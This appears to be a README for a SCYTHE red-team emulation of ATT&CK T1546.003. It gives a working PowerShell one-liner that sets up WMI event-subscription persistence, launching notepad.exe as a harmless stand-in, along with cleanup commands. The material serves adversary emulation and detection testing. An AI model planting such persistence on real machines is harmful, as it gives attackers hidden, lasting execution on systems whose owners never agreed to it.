# T1546.003 - Windows Management Instrumentation Event Subscription

This SCYTHE Compound Action performs persistance TTPs via Event Triggered Execution: Windows Management Instrumentation Event Subscription and executes through unmanaged PowerShell. 

## Import the Compound Action into SCYTHE
1. From the SCYTHE GUI, click Threat Manager - Migrate Threats
2. Under "Import Threat" click “Choose File” and select the JSON file you downloaded from GitHub
3. Click Import and OK when complete
4. Click Threat Manager - Threat Catalog
5. Find the imported Compound Action and click the tag icon 
6. Tag the MITRE ATT&CK Technique for the Compound Action

## Attack Emulation with SCYTHE
1. Create a new campaign
2. Select the Compound Action for T1546.003

## Manual Emulation
```
$FilterArgs = @{name='SCYTHE-WMIPersistence-Example'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs; $ConsumerArgs = @{name='SCYTHE-WMIPersistence-Example'; CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}; $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs; $FilterToConsumerArgs = @{Filter = [Ref] $Filter;Consumer = [Ref] $Consumer;};$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
```

### Manual Clean Up
```
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'SCYTHE-WMIPersistence-Example'"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'SCYTHE-WMIPersistence-Example'"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject
```

## References
- https://attack.mitre.org/techniques/T1546/003/
- https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.md